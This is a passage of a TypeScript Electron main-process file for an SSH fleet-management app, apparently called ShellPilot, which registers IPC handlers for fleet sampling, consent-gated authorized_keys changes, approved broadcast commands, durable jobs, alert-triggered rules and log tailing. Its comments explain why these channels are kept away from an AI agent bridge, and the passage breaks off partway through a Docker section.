// Whether the change log may READ — roadmap item 14. Kept beside the other two
// and refreshed from the same blob, and gated for a third distinct reason.
//
// The access probe is gated for what it does on a host and the posture probe
// for what it produces. This one produces nothing and touches no host: it opens
// four records that are written whether or not it is on. What a person consents
// to is having their own week ASSEMBLED out of them — which is more useful than
// any of the four separately, and is therefore also the thing to ask about.
//
// Absent reads as OFF, like both of its neighbours, so an upgrade never starts
// reading somebody's local session log for a screen they did not ask for.
let changeLogModuleOn = false
function syncAccessModule(data: unknown): void {
  const modules = (data as { settings?: { modules?: Record<string, unknown> } } | null)?.settings?.modules
  accessModuleOn = modules?.access === true
  postureModuleOn = modules?.posture === true
  changeLogModuleOn = modules?.changeLog === true
}
try {
  syncAccessModule(loadData())
} catch {
  // A blob that will not parse is not consent. Off.
  accessModuleOn = false
  postureModuleOn = false
  changeLogModuleOn = false
}

// Fleet key and access, on the same slow clock — roadmap item 23. One reader
// for the whole process, for the reason HostFactsReader is one: it holds no
// state beyond the exec function, and every probe is a single round trip.
const accessReader = new AccessReader({
  exec: (cfg, command, timeoutMs) =>
    sshExec(cfg as Parameters<typeof sshExec>[0], command, timeoutMs, false)
})

// Security posture, on the same slow clock — roadmap item 24. One reader for
// the whole process, for the reason the other two are one: it holds no state
// beyond the exec function, and every probe is a single round trip.
const postureReader = new PostureReader({
  exec: (cfg, command, timeoutMs) =>
    sshExec(cfg as Parameters<typeof sshExec>[0], command, timeoutMs, false)
})

const fleetSampler = new FleetSampler({
  // Secrets are resolved HERE, per sweep, not when targets are configured.
  // A config resolved at configure time would be stale the moment the vault
  // is unlocked or a credential is edited, and the sampler would go on using
  // it until something happened to reconfigure.
  // allowPrompt: false — this is the unattended caller. A never-connected
  // server is refused with an error the fleet UI can show, rather than raising
  // a host-key trust dialog the user cannot connect to any action they took.
  sample: (key, cfg) => metricsSample(key, resolveChainSecrets(cfg as SshConnectConfig), false),
  // The hourly half — roadmap item C. Injected exactly like `sample`, so the
  // sampler's tests never touch SSH.
  //
  // allowPrompt: false for the same reason. This is the unattended caller, and
  // a background inventory probe must never be what raises a host-key trust
  // dialog the user cannot connect to anything they just did.
  sampleFacts: async (_key, cfg) => {
    const probe = await hostFactsReader.read(resolveChainSecrets(cfg as SshConnectConfig))
    return probe.ok ? { ok: true, facts: probe.facts } : { ok: false, error: `${probe.reason}: ${probe.detail}` }
  },
  // The key and access half — roadmap item 23. Injected like `sampleFacts`, and
  // allowPrompt: false for the same reason: this is the unattended caller, and
  // reading who can log in to a host must never be what raises a host-key trust
  // dialog the user cannot connect to anything they just did.
  accessEnabled: () => accessModuleOn,
  sampleAccess: async (_key, cfg) => {
    const probe = await accessReader.read(resolveChainSecrets(cfg as SshConnectConfig))
    return probe.ok ? { ok: true, access: probe.access } : { ok: false, error: `${probe.reason}: ${probe.detail}` }
  },
  // The security posture half — roadmap item 24. Injected like `sampleAccess`,
  // and allowPrompt: false for the same reason: this is the unattended caller,
  // and reading a host's firewall must never be what raises a host-key trust
  // dialog the user cannot connect to anything they just did.
  postureEnabled: () => postureModuleOn,
  samplePosture: async (_key, cfg) => {
    const probe = await postureReader.read(resolveChainSecrets(cfg as SshConnectConfig))
    return probe.ok ? { ok: true, posture: probe.posture } : { ok: false, error: `${probe.reason}: ${probe.detail}` }
  },
  release: (key) => metricsDisconnect(key),
  emit: (event) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('fleet:sample', event)
  },
  // A vault that does not exist is not a locked vault: those installs keep
  // their credentials in the OS keychain or inline, and sampling works fine.
  // Only an existing-but-locked vault means every resolve would throw.
  vaultUnlocked: () => {
    const s = vaultStatus()
    return !s.exists || s.unlocked
  },
  // Resolved per sweep, not captured: this sampler is constructed at module
  // scope and the store opens asynchronously after it. Until then — and
  // forever, on a machine where history is off — this returns null and the
  // sweep is exactly what it was.
  history: () => historyStore
})

// So get_server_metrics can answer from what the monitor already sampled
// instead of opening a third connection per server.
setActiveFleetSampler(fleetSampler)

ipcMain.handle('fleet:configure', (_e, cfg: FleetSamplerConfig) => {
  fleetSampler.configure(cfg)
  return fleetSampler.status()
})
ipcMain.handle('fleet:status', () => fleetSampler.status())
// The hourly host-facts collection for one server, as the sampler last saw it.
//
// A read of what the sweep already has — it never triggers a probe. A view that
// wants fresher facts asks for a sweep, so there is exactly one thing deciding
// when a package manager is shelled out to.
ipcMain.handle('fleet:facts', (_e, serverId: string) => fleetSampler.factsFor(serverId))
// Who can get into one server, as the sweep last saw it — roadmap item 23.
//
// A read of what the sweep already has; it never triggers a probe, for the same
// reason 'fleet:facts' does not. There is exactly one thing deciding how often
// every home directory on every host gets stat'ed, and it is the sampler.
ipcMain.handle('fleet:access', (_e, serverId: string) => fleetSampler.accessFor(serverId))
// One server's security posture, as the sweep last saw it — roadmap item 24.
//
// A read of what the sweep already has; it never triggers a probe, for the same
// reason 'fleet:facts' and 'fleet:access' do not. There is exactly one thing
// deciding how often every host gets asked for its firewall ruleset, and it is
// the sampler.
//
// There is deliberately no MCP tool beside this. `fleet:posture` is a renderer
// channel and nothing else — see the forbidden-symbol list in
// tests/jobsNotExposed.test.ts for why an agent does not get to ask which of
// the estate's hosts has SELinux switched off.
ipcMain.handle('fleet:posture', (_e, serverId: string) => fleetSampler.postureFor(serverId))

// ---- Changing who can get in — roadmap item 23, the write half ----
//
// The most consequential write this app makes, and the only one built as a
// protocol rather than as a command. shared/access.ts argues the three rules in
// full; what lives here is the part that cannot live there.
//
// MAIN RE-DERIVES THE PLAN. The renderer says which key and which servers; it
// does not say what will run. Everything that decides — which accounts were
// read, whether sshd reads the file being edited, whether the key is the one
// this session is on — comes from the collection MAIN holds, and the command is
// built here from it. What the renderer sends back is the command text it
// showed the operator, and if that does not match what main derived, nothing
// runs. Same shape as `broadcast:run`, for the same reason B3 gave: a plan
// computed in a `useMemo` and thrown away is not a record of anybody agreeing
// to anything.
//
// NOT EXPOSED TO THE MCP BRIDGE, and this is the clearest case in the app for
// that line. An agent gets `execute_command` gated per server; editing
// authorized_keys across a selection is a different consent story entirely, and
// the answer to "should an agent be able to revoke a key from twelve hosts" is
// no, not "not yet".
//
// ONE ACCOUNT: THE ONE SHELLPILOT CONNECTS AS. The staged write resolves
// `$HOME/.ssh/authorized_keys` on the host, so one approved command text covers
// a whole selection — which also means it can only ever edit the connecting
// account's file. `planAccessChange` permits a target on another account,
// because another account's keys cannot lock this session out and rule 1 has no
// reason to block it; the COMMAND cannot serve one. So the refusal is here, as
// that file's own comment says it must be. Without it a revoke aimed at
// `deploy` would back up and rewrite `ops`'s file instead — it would fail the
// count check and change nothing, and it would report the wrong reason for
// having done nothing, which on an access review is its own kind of lie.
const accessCommitter = new AccessCommitter({
  // The ONLY thing in this app that opens a connection which cannot be the one
  // that wrote the file. See sshOpenFresh and rule 2.
  openFresh: (cfg) => sshOpenFresh(resolveChainSecrets(cfg as SshConnectConfig))
})

/** How long one host's staged write is given. Longer than a read probe: it
 *  copies a file, filters it, counts it and arms a watchdog. */
const ACCESS_STAGE_TIMEOUT_MS = 45_000

/** A preview may not be confirmed forever. The token IS the plan's clock, so
 *  an old one is an old collection — and a command approved against last
 *  week's inventory is exactly the stale-write this feature refuses. */
const ACCESS_PREVIEW_MAX_AGE_MS = 10 * 60_000

function deriveAccessPlan(
  req: Pick<AccessRunRequest, 'kind' | 'fingerprint' | 'targets'>,
  now: number
): { plan: ReturnType<typeof planAccessChange>; refusals: AccessRefusal[] } {
  const refusals: AccessRefusal[] = []
  const targets: AccessChangeTarget[] = []
  for (const t of req.targets) {
    const held = fleetSampler.accessFor(t.serverId)
    if (!held?.access) {
      refusals.push({
        serverId: t.serverId,
        serverName: t.serverName,
        user: t.user,
        reason: `${t.serverName} has no collected authorized_keys to edit. A change is always an edit to a file that was READ, never to one that was assumed — collect it first.`
      })
      continue
    }
    if (held.access.collectedAs !== t.user) {
      refusals.push({
        serverId: t.serverId,
        serverName: t.serverName,
        user: t.user,
        reason: `the change would run as ${held.access.collectedAs} on ${t.serverName} and can only edit that account's own authorized_keys, not ${t.user}'s. Connect as ${t.user} to change ${t.user}'s keys.`
      })
      continue
    }
    targets.push({
      serverId: t.serverId,
      serverName: t.serverName,
      access: held.access,
      user: t.user
    })
  }
  return {
    plan: planAccessChange({
      kind: req.kind,
      fingerprint: req.fingerprint,
      targets,
      now
    }),
    refusals
  }
}

ipcMain.handle('access:plan', (_e, req: Omit<AccessRunRequest, 'token' | 'confirmedCommand'>): AccessChangePreview => {
  // THE GATE, before anything is derived and before the module switch is even
  // consulted. See ACCESS_WRITE_ENABLED in shared/access.ts for the argument.
  //
  // Here rather than only in the renderer because the renderer hiding a button
  // is a courtesy and this is the boundary: it covers a renderer that lies
  // about what it can do, a resumed job, and whatever calls this next.
  if (!ACCESS_WRITE_ENABLED) throw new Error(ACCESS_WRITE_DISABLED_REASON)
  if (!accessModuleOn) throw new Error('Key and access management is switched off in Settings.')
  const now = Date.now()
  const { plan, refusals } = deriveAccessPlan(req, now)
  return {
    token: plan.token,
    command: plan.write?.command ?? '',
    hosts: plan.targets.map((t) => ({
      serverId: t.serverId,
      serverName: t.serverName,
      user: req.targets.find((x) => x.serverId === t.serverId)?.user ?? ''
    })),
    blocks: plan.blocks,
    refusals,
    rollbackSeconds: plan.rollbackSeconds
  }
})

ipcMain.handle('access:run', async (_e, req: AccessRunRequest): Promise<AccessRunResult> => {
  // The same gate, first, and not merely because `access:plan` already has one:
  // a caller that never asked for a plan can reach this channel directly, and
  // this is the one that writes.
  if (!ACCESS_WRITE_ENABLED) throw new Error(ACCESS_WRITE_DISABLED_REASON)
  if (!accessModuleOn) throw new Error('Key and access management is switched off in Settings.')

  const at = Number(req.token)
  if (!Number.isFinite(at) || !/^\d{10,16}$/.test(req.token)) {
    throw new Error('This change was not started: its plan could not be identified.')
  }
  if (Date.now() - at > ACCESS_PREVIEW_MAX_AGE_MS) {
    throw new Error(
      'This change was not started: the plan it was confirmed against is more than ten minutes old, and the estate may have changed since. Look at it again.'
    )
  }

  const { plan, refusals } = deriveAccessPlan(req, at)
  const command = plan.write?.command ?? ''
  if (command === '' || command !== req.confirmedCommand) {
    // Not a warning and not a retry. What was agreed to is not what this would
    // run, and there is no version of that worth resolving automatically.
    throw new Error(
      'This change was not started: what would run on the hosts is not what was confirmed. The collection has changed since the plan was shown, so look at it again.'
    )
  }

  const notStaged: AccessStagingFailure[] = []
  const reports: AccessCommitReport[] = []

  // ONE HOST AT A TIME, as the plan asks. A key change rolled across a
  // selection in parallel is the case where a mistake reaches every machine
  // before the first failure is visible; serialised, the second host is still
  // reachable while the first is being looked at.
  for (const target of plan.targets) {
    const t = req.targets.find((x) => x.serverId === target.serverId)
    const account = fleetSampler
      .accessFor(target.serverId)
      ?.access?.accounts.find((a) => a.user === t?.user)
    if (!t || !account?.keyPath) {
      notStaged.push({
        serverId: target.serverId,
        serverName: target.serverName,
        detail: 'the collection for this host changed while the change was being confirmed.'
      })
      continue
    }

    const staged = await sshExec(
      resolveChainSecrets(t.cfg as SshConnectConfig),
      command,
      ACCESS_STAGE_TIMEOUT_MS,
      // allowPrompt false. A key change must never be what raises a host-key
      // trust dialog: a host this app has not connected to before is a host
      // whose authorized_keys it has not read either.
      false
    )
    // The moment the file changed on the host, as closely as this side can
    // know it. Everything about rule 2 turns on the verifying session having
    // authenticated after this, so it is taken here and not a line later.
    const stagedAt = Date.now()
    if (!staged.ok || staged.code !== 0) {
      notStaged.push({
        serverId: target.serverId,
        serverName: target.serverName,
        detail:
          (staged.stderr || staged.error || `the host exited ${String(staged.code)}`)
            .trim()
            .split('\n')[0]
            .slice(0, 200) || 'the staged write did not run'
      })
      continue
    }

    reports.push(
      await accessCommitter.confirm(t.cfg, {
        serverId: target.serverId,
        serverName: target.serverName,
        user: t.user,
        token: plan.token,
        keyPath: account.keyPath,
        stagedAt,
        rollbackSeconds: plan.rollbackSeconds ?? ACCESS_ROLLBACK_SECONDS
      })
    )
  }

  return { blocks: plan.blocks, refusals, notStaged, reports }
})

// ---- Run one command across many servers ----
//
// THIS COMMENT USED TO SAY THE OPPOSITE, and the reversal is roadmap item B3.
// What stood here was:
//
//     "The approval model ... is enforced in the renderer, where the user is.
//      Main deliberately does not re-derive it: a second copy of a safety rule
//      is a second thing to drift, and the renderer is not a trust boundary
//      here — anyone driving it already has a terminal on these hosts."
//
// Every clause of that is still true and the conclusion no longer follows,
// because the premise it rested on was that the person who approved a run is
// present for the whole of it. B2 made a job outlive the process. A job resumed
// at the next launch is being acted on by a ShellPilot that never showed
// anybody a dialog, and "the renderer computed a plan" was never a fact written
// down anywhere — `BroadcastPlan` lived in a `useMemo` and was discarded.
//
// So main re-derives, and the second copy the old comment feared is avoided the
// only way it can be: there is ONE implementation of the rule, in
// shared/broadcast.ts, called from both sides. The renderer calls it to ask the
// human; main calls it to check that what arrived is what was asked about. It
// is still not sold as a trust boundary — it is a RECORD and an AGREEMENT
// CHECK, which is what a durable job needs and what neither the renderer-only
// path nor the AI capability gate produced.
//
// What main owns beyond that is the part the renderer cannot do safely: bounded
// concurrency, cancellation that actually stops queued hosts, and per-host
// results.
//
// Not exposed to the MCP bridge. An agent gets `execute_command` gated per
// server against an access group; a fan-out primitive is a different risk with
// a different consent story, and handing one to an agent because the UI grew
// one would be an accident rather than a decision.
const broadcast = new BroadcastRunner({
  exec: async (cfg, command, timeoutMs) => {
    // allowPrompt false: a fan-out across fifteen hosts with unknown keys would
    // raise fifteen stacked trust dialogs, and a stack of identical modals is
    // not a decision anyone can reason about. Such a host fails with a reason.
    const r = await sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs, false)
    return { ok: r.ok, code: r.code, stdout: r.stdout, stderr: r.stderr, error: r.error, truncated: r.truncated }
  },
  emit: (progress: BroadcastProgress) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('broadcast:progress', progress)
  }
})

ipcMain.handle('broadcast:run', async (_e, req: BroadcastRequest) => {
  // B3: the same check a job gets, over the same shared implementation.
  //
  // A broadcast has no store and therefore no row to hold the record — that is
  // exactly what a JOB is, and duplicating the job store here would be the
  // second model this item exists to prevent. What it does share is the record
  // type, the verifier, and the log: one approval model, one file, two
  // surfaces.
  const verdict = verifyApproval(
    req.approval,
    { commands: [req.command], targets: req.targets },
    planBroadcast(req.command, req.targets)
  )
  const logRow = {
    surface: 'broadcast' as const,
    jobId: req.runId,
    title: 'Broadcast',
    risk: req.approval?.risk ?? planBroadcast(req.command, req.targets).risk,
    confirmation: req.approval?.confirmation?.kind ?? 'none',
    phrase: req.approval?.phrase ?? null,
    confirmedAt: req.approval?.confirmedAt ?? null,
    hosts: req.targets.map((t) => t.serverName),
    commands: [req.command]
  }
  if (!verdict.ok) {
    recordJobApproval({ ...logRow, event: 'refused', reason: verdict.reason })
    throw new Error(`This broadcast was not started: ${verdict.reason}`)
  }
  recordJobApproval({ ...logRow, event: 'granted' })
  // Secrets are resolved per host inside exec, not carried in the request, for
  // the same reason the fleet targets do not carry them.
  return broadcast.run(req)
})
ipcMain.handle('broadcast:cancel', (_e, runId: string) => broadcast.cancel(runId))

// ---- Jobs ----
//
/**
 * This ShellPilot's id, stable across restarts on this machine.
 *
 * STABLE is the requirement, not unique-per-launch. It is what a marker
 * directory records, and it is how a reclaim tells "this is mine, finish
 * watching it and reap it" from "another ShellPilot started this, read it and
 * leave the directory alone". An id minted per launch would make every job
 * foreign to the instance that started it the moment the app restarted, and
 * markers would accumulate on every host until the sweep took them.
 *
 * A file rather than a machine fingerprint: two ShellPilots on one machine with
 * separate userData directories — a portable build next to an installed one —
 * are genuinely two instances and should say so.
 */
function shellpilotInstanceId(): string {
  const file = join(app.getPath('userData'), 'instance-id')
  try {
    const existing = readFileSync(file, 'utf8').trim()
    // Validated, not merely read: it is going into a path on a remote host, and
    // assertSafeJobId in shared/jobs.ts would refuse it later — at launch time,
    // per host, which is a worse place to find out.
    if (/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/.test(existing)) return existing
  } catch {
    /* first run, or an unreadable file: mint a new one below */
  }
  const minted = `sp-${randomUUID()}`
  try {
    writeFileSync(file, `${minted}\n`, { encoding: 'utf8', mode: 0o600 })
  } catch (e) {
    // A machine where userData is not writable still gets a working app; what
    // it loses is cross-restart ownership of its markers, which degrades to
    // "every reclaimed job looks foreign" — readable, cancellable, not reaped.
    console.error('[jobs] could not record an instance id:', e)
  }
  return minted
}

//
// Roadmap item B1: a broadcast that outlives its panel. The row exists in the
// store before the first host is touched, every transition is written, and a
// job read back after a restart is the same job rather than a new record
// describing it.
//
// What it deliberately does NOT claim is surviving a dropped connection. B1
// runs on the attached path, where `sshExec` on timeout resolves and abandons
// without signalling the remote, and where a dying socket means sshd sends
// SIGHUP — which apt and dpkg do not ignore. A job that was running when this
// process stopped is `abandoned`, and adopt() writes that down at the next
// launch instead of leaving a row claiming it is still going. B2 replaces the
// executor with a detached launch; nothing else here changes, which is why the
// executor is an injected strategy rather than a call to sshExec.
//
// NOT exposed to the MCP bridge, and the reason is not broadcast's repeated.
// Durability defeats revocation: `denyAllPending()` resolves requests that are
// PENDING, and can do nothing about a job already running on fifteen hosts,
// because nothing is pending. See tests/jobsNotExposed.test.ts.
// The executor is a module, not a lambda: see the header of jobExec.ts. It
// streams rather than buffering, because `sshExec` stops appending at 200 KB
// and drops the rest — which put the ceiling BELOW the runner's own head+tail
// budget and made a 3 MB upgrade read back as complete.
const attachedExec = attachedJobExecutor({
  stream: (cfg, command, handlers, allowPrompt) =>
    sshExecStream(resolveChainSecrets(cfg as SshConnectConfig), command, handlers, allowPrompt)
})

/**
 * The Settings switch, held here and read per launch.
 *
 * Defaults ON, because the attached path is not a safer version of this — it is
 * the one that leaves dpkg interrupted on every host when the lid closes. Off
 * is for the operator who wants nothing whatsoever written to their machines,
 * and it is honestly labelled as the weaker behaviour rather than as the
 * cautious one. Pushed from the renderer at startup like sshMasterIdleMinutes;
 * until it arrives this default applies.
 */
let jobsDetachedEnabled = true
const jobCapabilities = new Map<string, JobHostCapabilityReport>()

const detachedExec = detachedJobExecutor({
  // allowPrompt false, for broadcast's reason: a fan-out across hosts with
  // unknown keys would raise a stack of identical trust dialogs.
  run: async (cfg, command, timeoutMs) => {
    const r = await sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs, false)
    return { ok: r.ok, code: r.code, stdout: r.stdout, stderr: r.stderr, error: r.error }
  },
  instanceId: shellpilotInstanceId(),
  attached: attachedExec,
  enabled: () => jobsDetachedEnabled,
  // A vault that does not exist is not a locked vault — fleetSampler's rule,
  // and the same one-liner. What differs is the consequence: a parked SAMPLE
  // loses a data point, while a parked POLL loses nothing at all, because the
  // byte cursor makes the next one pick up exactly where this would have.
  vaultUnlocked: () => {
    const st = vaultStatus()
    return !st.exists || st.unlocked
  },
  onCapability: (report) => {
    jobCapabilities.set(report.serverId, report)
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('jobs:capability', report)
    }
  }
})

/**
 * The reboot-ordering refusal — item 17, enforced in MAIN.
 *
 * A HARD REFUSAL rather than a confirmation. The argument is written out in
 * shared/topology.ts and it comes down to one sentence: a question asked
 * fifteen times during a staged estate upgrade is answered by reflex, and
 * rebooting the machine every other connection runs through is not a thing to
 * be sure about.
 *
 * It lives here, at the door every job goes through, rather than only in the
 * panel that offers the button. A check that exists only in the renderer is a
 * check the next caller does not have — and the renderer is, by B2's own
 * argument, gone by the time a durable job is being acted on.
 *
 * BOTH the declared reboot step and a command that merely LOOKS like one are
 * checked. The declaration is what earns reboot-and-wait; the guess is enough
 * to earn a refusal, because a refusal costs an operator one deliberate run on
 * one host and being wrong costs them the bastion.
 *
 * The topology hole — hops that name no saved server — is reported in the
 * refusal text rather than closed. There is nothing here that could close it.
 */
function rebootOrderingRefusal(req: JobRunRequest): string | null {
  const restarts = req.spec.steps.some((s) => s.reboot === true || restartsTheMachine(s.command))
  if (!restarts) return null

  const topo = buildTopology(
    // host/port travel with the record, and they are not decoration: they are
    // how a bare hop is recognised as a saved machine and how two saved records
    // are recognised as one. Trimming them here would put the serverId-only
    // blind spot back at the door every job goes through.
    listCachedServers().map((srv) => ({
      id: srv.id,
      name: srv.name,
      host: srv.host,
      port: srv.port,
      route: srv.route
    })),
    listCachedDatabases().map((db) => ({
      id: db.id,
      name: db.name,
      kind: db.kind,
      database: db.database,
      sshServerId: db.sshServerId
    }))
  )

  const blocks: RebootBlock[] = []
  for (const t of req.targets) {
    const b = rebootBlockFor(topo, t.serverId)
    if (b !== null) blocks.push(b)
  }
  for (const wave of jobCohorts(req.targets)) {
    blocks.push(...sameWaveDatabaseBlocks(topo, wave.targets.map((t) => t.serverId)))
  }
  if (blocks.length === 0) return null

  const seen = new Set<string>()
  const lines = blocks
    .filter((b) => {
      const k = `${b.kind}:${b.serverId}`
      if (seen.has(k)) return false
      seen.add(k)
      return true
    })
    .map((b) => b.reason)
  const note = unmatchedHopNote(topo)
  return [...lines, ...(note === null ? [] : [note])].join(' ')
}

/**
 * What the wave gate reads — B4.
 *
 * The fleet sampler's cache, shaped for `evaluateGate`, and NOT a probe of its
 * own. A gate that ran its own SSH health check would be a second
 * implementation of "is this host healthy" in the process deciding whether to
 * keep rolling an estate upgrade, which is the disagreement hostHealth.ts was
 * moved into shared/ to end.
 *
 * `sampledAt` is the NEWEST observation of any kind, success or failure, and
 * that matters: a host that went down during the wave has an `errorAt` and no
 * new `at`, and a gate reading only the success timestamp would call the
 * freshest possible evidence of a problem "stale" and wait five minutes for a
 * success that is never coming.
 */
function gateHealthFor(serverIds: string[]): GateHost[] {
  return serverIds.map((serverId) => {
    const entry = fleetCached(serverId)?.entry
    const name = getCachedServer(serverId)?.name ?? serverId
    const at = entry?.at ?? null
    const errorAt = entry?.errorAt ?? null
    const unreachable = entry?.error !== undefined && (errorAt ?? 0) >= (at ?? 0)
    const services = entry?.host?.services ?? null
    return {
      serverId,
      serverName: name,
      sampledAt: at === null && errorAt === null ? null : Math.max(at ?? 0, errorAt ?? 0),
      unreachable,
      unreachableError: unreachable ? (entry?.error ?? null) : null,
      // null, not [], when systemd could not be asked. hostHealth.ts's rule,
      // and here it decides whether the host is `unverified` (reported, not
      // blocking) rather than healthy.
      failedUnits:
        services === null
          ? null
          : services.filter((u) => u.active === 'failed' || u.sub === 'failed').map((u) => u.name)
    }
  })
}

const jobRunner = new JobRunner({
  exec: detachedExec,
  guard: rebootOrderingRefusal,
  health: gateHealthFor,
  // B3. Injected rather than imported inside the runner, so the runner stays
  // constructible without an Electron `app` object and a test can hand in an
  // array. The refusal happens with or without this; what a missing one loses
  // is the record of it.
  approvalLog: recordJobApproval,
  // Sized for the detached path, which deliberately outlives a dropped link:
  // its worst honest case is a full reconnect backoff plus a poll, and the
  // attached executor's own timer fires long before this either way.
  stallGraceMs: JOB_DETACHED_STALL_GRACE_MS,
  store: jobStore,
  emit: (progress) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('jobs:progress', progress)
  },
  emitOutput: (output) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('jobs:output', output)
  }
})

// ---- Rules (roadmap item 27) ----
//
// "When this alert fires, run that job, then call that webhook."
//
// Constructed HERE and nowhere else, the same single-construction-site rule
// tests/jobsNotExposed.test.ts asserts about the job runner — a second engine
// would be a second idea of what a rule may do. Everything it acts with is
// injected, so the engine itself holds no executor, no credential and no
// webhook URL:
//
//  * `runJob` goes through `jobRunner.run`, which re-derives `planJob` over the
//    rule's own spec and target list and refuses if the stored approval
//    disagrees. A rule does not get a private door into the job engine; it uses
//    the same one a person does, and is refused by the same gate.
//  * `notify` is `webhookNotify`, which rebuilds the payload from its own
//    whitelist. The rule engine may say a thing happened; it may not choose the
//    shape that leaves the machine.
//  * `resolveTarget` resolves a PINNED serverId against the current workspace
//    and returns null when that host is gone, which the engine treats as a
//    refusal of the whole rule rather than as a smaller run.
//
// Deliberately NOT reachable from the MCP bridge or the CLI. See
// tests/rulesNotExposed.test.ts: DURABILITY DEFEATS REVOCATION, and a rule is
// the worst case of it — between firings it has nothing pending at all, so
// `denyAllPending()` has no list it appears on.
const RULES_PATH = join(app.getPath('userData'), RULES_FILE)

/** Same store accessor discipline as `jobStore`: resolved per call rather than
 *  captured, because the engine is constructed at module scope and the history
 *  store opens asynchronously after it — or never. */
const ruleStore: RuleEventStore = {
  readEvents: (filter) => historyStore?.readEvents(filter) ?? [],
  recordEvent: (kind, hostId, payload, at) => historyStore?.recordEvent(kind, hostId, payload, at)
}

const ruleEngine = new RuleEngine({
  // A getter would be nicer; this object is cheap and the engine only reads
  // `store` inside a sweep, so the indirection above is what makes it live.
  get store(): RuleEventStore | null {
    return historyStore === null ? null : ruleStore
  },
  now: () => Date.now(),
  read: () => {
    try {
      if (existsSync(RULES_PATH)) return JSON.parse(readFileSync(RULES_PATH, 'utf8'))
    } catch (err) {
      // Nothing here is worth failing app start over, and every field is
      // narrowed again by `sanitiseRules` regardless. A rules file that will
      // not parse is no rules, which is the safe direction: it disarms rather
      // than arming something half-read.
      console.error('[rules] file unreadable, starting with none:', err)
    }
    return null
  },
  write: (file: RulesFile) => {
    try {
      // Temp-then-rename at 0600, matching store.ts/vault.ts/policyStore.ts.
      // This file holds approval records: a torn write is a rule whose
      // authorisation half-survived.
      writeFileSync(`${RULES_PATH}.tmp`, JSON.stringify(file), { mode: 0o600 })
      renameSync(`${RULES_PATH}.tmp`, RULES_PATH)
    } catch (err) {
      console.error('[rules] save failed:', err)
    }
  },
  notify: (raw) => webhookNotify(raw),
  version: () => app.getVersion(),
  newId: () => randomUUID(),
  resolveTarget: (serverId) => {
    const server = getCachedServer(serverId)
    // Null means "this host is not in the workspace any more", and the engine
    // refuses the whole rule on it. Resolved fresh at every firing rather than
    // stored with the rule, so a machine that moved is dialled at its new
    // address and one that was deleted is not dialled at all.
    if (!server) return null
    return { ...serverToSshConfig(server), sessionId: `rule:${serverId}` }
  },
  runJob: (launch) => {
    if (!historyStore) {
      throw new Error(
        'Jobs need the history store, which is not open on this machine, so this rule did not run.'
      )
    }
    return jobRunner.run(launch)
  }
})

ipcMain.handle('rules:list', () => ruleEngine.list())
ipcMain.handle('rules:create', (_e, draft: RuleDraftWire) => ruleEngine.create(draft))
ipcMain.handle('rules:enable', (_e, id: string, enabled: boolean) =>
  ruleEngine.setEnabled(id, enabled === true)
)
ipcMain.handle('rules:remove', (_e, id: string) => ruleEngine.remove(id))

ipcMain.handle('jobs:list', (_e, limit?: number) => jobRunner.list(limit))
ipcMain.handle('jobs:get', (_e, jobId: string) => jobRunner.get(jobId))
ipcMain.handle('jobs:run', async (_e, req: JobRunRequest) => {
  // A job with no store is not a job: the whole of what B1 adds over a
  // broadcast is the row. Refusing with a sentence beats running something the
  // user believes is being recorded and is not.
  if (!historyStore) {
    throw new Error(
      'Jobs need the history store, which is not open on this machine. Run this as a broadcast ' +
        'instead, or see the console for why history is disabled.'
    )
  }
  return jobRunner.run(req)
})
ipcMain.handle('jobs:cancel', (_e, jobId: string) => jobRunner.cancel(jobId))
ipcMain.handle('jobs:setDetached', (_e, enabled: boolean) => {
  jobsDetachedEnabled = enabled !== false
})
ipcMain.handle('jobs:capabilities', () => [...jobCapabilities.values()])

// ---- Live log tailing across hosts ----
//
// The remote command is built in shared/logtail.ts from a validated source and
// is never taken from the caller: a tail is a read, and a caller that can pass
// arbitrary text turns this into "run anything on N hosts" without any of the
// confirmation broadcast requires.
const logTailer = new LogTailer({
  execStream: (cfg, command, handlers) =>
    // Same reason as broadcast: several hosts at once, no stacked dialogs.
    sshExecStream(resolveChainSecrets(cfg as SshConnectConfig), command, handlers, false),
  emitLine: (line: LogLine) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('logtail:line', line)
  },
  emitState: (state: LogTailState) => {
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('logtail:state', state)
  }
})

ipcMain.handle(
  'logtail:start',
  (_e, tailId: string, source: LogSource, targets: { serverId: string; serverName: string; cfg: unknown }[]) =>
    logTailer.start(tailId, source, targets)
)
ipcMain.handle('logtail:stop', (_e, tailId: string) => {
  logTailer.stop(tailId)
  return true
})
// Pause holds the stream and leaves the SSH channel open, so narrowing what you
// are looking at does not cost the buffer you were reading. Stop is still the
// thing that ends the remote command.
// The unit picker's source. A unit name typed from memory is how you get
// "systemd does not know this unit", and not making the mistake beats
// explaining it well.
ipcMain.handle('logtail:units', (_e, cfg: unknown) =>
  logTailer.listUnits(
    (c, command, timeoutMs) =>
      sshExec(resolveChainSecrets(c as SshConnectConfig), command, timeoutMs, false),
    cfg
  )
)
ipcMain.handle('logtail:logfiles', (_e, cfg: unknown) =>
  logTailer.listLogFiles(
    (c, command, timeoutMs) =>
      sshExec(resolveChainSecrets(c as SshConnectConfig), command, timeoutMs, false),
    cfg
  )
)
ipcMain.handle('logtail:pause', (_e, tailId: string) => logTailer.pause(tailId))
ipcMain.handle('logtail:resume', (_e, tailId: string) => logTailer.resume(tailId))

// ---- Docker ----
//
// Shelling out to the host's own `docker` binary rather than speaking the API:
// it inherits the user's existing auth, including cloud credential helpers we
// would otherwise reimplement. The cost is unstructured errors, which is why
// classification lives in shared/docker.ts and is tested — "no containers" for
// a missing binary, a stopped daemon and a permissions problem alike is a UI
// lying about two of the three.
//
// `docker exec` is arbitrary code execution on the host and membership of the
// docker group is root-equivalent on most installs. The module is off by
// default for that reason.
//
// To be exact about what "off" buys, because the sentence above on its own
// implies more than is true: the module toggle hides the UI. Every handler here
// is registered at boot regardless of `settings.modules`, so turning Docker off
// removes the panel, not the channel. That is consistent with the model — the
// renderer is not a trust boundary, and anyone who can drive it already has a
